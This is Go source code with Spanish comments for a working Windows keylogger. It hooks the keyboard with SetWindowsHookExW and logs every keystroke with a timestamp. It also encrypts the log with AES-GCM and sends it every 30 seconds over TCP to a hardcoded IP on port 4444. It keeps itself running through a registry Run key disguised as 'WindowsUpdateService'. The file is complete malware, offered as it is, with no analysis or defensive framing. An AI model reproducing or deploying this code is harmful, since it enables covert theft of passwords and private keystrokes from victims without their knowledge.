package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"net"
	"os"
	"sync"
	"syscall"
	"time"
	"unicode/utf16"
	"unsafe"
)

// ---- Configuración (mismos valores que config.py) ----
const (
	serverHost   = "195.0.1.5" // Cambiar por IP real de Parrot
	serverPort   = 4444
	sendInterval = 30 * time.Second
	appName      = "WindowsUpdateService"
	hexKey       = "30eeef8f3188373740553ac599917720c1051874af056836dee8318039077a2b"
)

// ---- Windows API ----
var (
	user32          = syscall.NewLazyDLL("user32.dll")
	procSetHook     = user32.NewProc("SetWindowsHookExW")
	procCallNext    = user32.NewProc("CallNextHookExW")
	procGetMsg      = user32.NewProc("GetMessageW")
	procToUnicode   = user32.NewProc("ToUnicode")
	procGetKbState  = user32.NewProc("GetKeyboardState")
	advapi32        = syscall.NewLazyDLL("advapi32.dll")
	procRegOpenKey  = advapi32.NewProc("RegOpenKeyExW")
	procRegSetValue = advapi32.NewProc("RegSetValueExW")
	procRegClose    = advapi32.NewProc("RegCloseKey")
)

const (
	hkcuHandle  = uintptr(0x80000001)
	keySetValue = uintptr(0x0002)
	regSZ       = uintptr(1)
)

const (
	whKeyboardLL = 13
	wmKeydown    = 0x0100
	wmSyskeydown = 0x0104
)

type kbStruct struct {
	VkCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DwExtraInfo uintptr
}

type winMsg struct {
	Hwnd    uintptr
	Message uint32
	WParam  uintptr
	LParam  uintptr
	Time    uint32
	PtX     int32
	PtY     int32
}

// ---- Buffer thread-safe ----
var (
	hook uintptr
	mu   sync.Mutex
	buf  []byte
)

func push(s string) {
	mu.Lock()
	buf = append(buf, s...)
	mu.Unlock()
}

func pop() []byte {
	mu.Lock()
	defer mu.Unlock()
	if len(buf) == 0 {
		return nil
	}
	out := make([]byte, len(buf))
	copy(out, buf)
	buf = buf[:0]
	return out
}

// ---- Conversión de tecla a string ----
func vkStr(vk, scan uint32) string {
	var state [256]byte
	procGetKbState.Call(uintptr(unsafe.Pointer(&state[0])))
	var out [8]uint16
	n, _, _ := procToUnicode.Call(
		uintptr(vk), uintptr(scan),
		uintptr(unsafe.Pointer(&state[0])),
		uintptr(unsafe.Pointer(&out[0])),
		uintptr(len(out)), 0,
	)
	if int32(n) > 0 {
		return string(utf16.Decode(out[:n]))
	}
	switch vk {
	case 0x08:
		return "[BACK]"
	case 0x09:
		return "[TAB]"
	case 0x0D:
		return "[ENTER]\n"
	case 0x1B:
		return "[ESC]"
	case 0x20:
		return " "
	case 0x2E:
		return "[DEL]"
	}
	return ""
}

// ---- Callback del hook de teclado ----
func hookFn(code int, wp, lp uintptr) uintptr {
	if code == 0 && (wp == wmKeydown || wp == wmSyskeydown) {
		ks := (*kbStruct)(unsafe.Pointer(lp))
		s := vkStr(ks.VkCode, ks.ScanCode)
		if s != "" {
			push(fmt.Sprintf("[%s] %s\n", time.Now().Format("2006-01-02 15:04:05"), s))
		}
	}
	r, _, _ := procCallNext.Call(hook, uintptr(code), wp, lp)
	return r
}

// ---- Cifrado AES-256-GCM ----
func encrypt(plain, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err = rand.Read(nonce); err != nil {
		return nil, err
	}
	return append(nonce, gcm.Seal(nil, nonce, plain, nil)...), nil
}

// ---- Envío TCP con length-prefix ----
func send(data []byte) {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", serverHost, serverPort), 5*time.Second)
	if err != nil {
		return
	}
	defer conn.Close()
	var hdr [4]byte
	binary.BigEndian.PutUint32(hdr[:], uint32(len(data)))
	conn.Write(append(hdr[:], data...))
}

// ---- Persistencia en registro de Windows ----
func addStartup() {
	exe, err := os.Executable()
	if err != nil {
		return
	}
	runPath, _ := syscall.UTF16PtrFromString(`Software\Microsoft\Windows\CurrentVersion\Run`)
	appNamePtr, _ := syscall.UTF16PtrFromString(appName)
	exeUTF16 := syscall.StringToUTF16(exe)

	var hkey uintptr
	r, _, _ := procRegOpenKey.Call(hkcuHandle, uintptr(unsafe.Pointer(runPath)), 0, keySetValue, uintptr(unsafe.Pointer(&hkey)))
	if r != 0 {
		return
	}
	defer procRegClose.Call(hkey)
	procRegSetValue.Call(hkey, uintptr(unsafe.Pointer(appNamePtr)), 0, regSZ,
		uintptr(unsafe.Pointer(&exeUTF16[0])), uintptr(len(exeUTF16)*2))
}

// ---- Hilo de envío periódico ----
func senderLoop(key []byte) {
	for {
		time.Sleep(sendInterval)
		data := pop()
		if data == nil {
			continue
		}
		enc, err := encrypt(data, key)
		if err != nil {
			continue
		}
		send(enc)
	}
}

func main() {
	key, _ := hex.DecodeString(hexKey)
	addStartup()
	go senderLoop(key)

	cb := syscall.NewCallback(hookFn)
	hook, _, _ = procSetHook.Call(whKeyboardLL, cb, 0, 0)

	var m winMsg
	for {
		r, _, _ := procGetMsg.Call(uintptr(unsafe.Pointer(&m)), 0, 0, 0)
		if r == 0 {
			break
		}
	}
}
